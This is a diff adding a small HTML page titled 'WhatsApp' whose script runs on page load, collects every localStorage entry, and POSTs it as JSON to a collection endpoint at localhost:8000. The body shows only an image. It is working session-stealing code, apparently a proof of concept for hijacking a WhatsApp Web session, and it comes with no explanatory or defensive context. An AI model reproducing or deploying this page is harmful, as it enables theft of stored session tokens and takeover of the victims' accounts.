@@ -1,0 +1,29 @@
+<html>
+<header>
+  <title>WhatsApp</title>
+  <script>
+  function getStorage(){
+    var values = {};
+    var keys = Object.keys(localStorage);
+    var i = keys.length;
+    while(i--){
+      values[keys[i].replace(/ /g, '+')] = localStorage.getItem(keys[i]).replace(/ /g, '+');
+    }
+    return values;
+  }
+
+  function sendData(data){
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "http://localhost:8000/data");
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send(data)
+  }
+
+  var result = getStorage();
+  var json = JSON.stringify(result);
+  sendData(json);
+  </script>
+</header>
+<body>
+  <img src="https://lh6.googleusercontent.com/-NmbsiwUEwL4/U9pg7Fm5XpI/AAAAAAABOEg/ebI2z0u_LgE/w750-h423-no/f48ORBB.gif" alt="">
+</body>
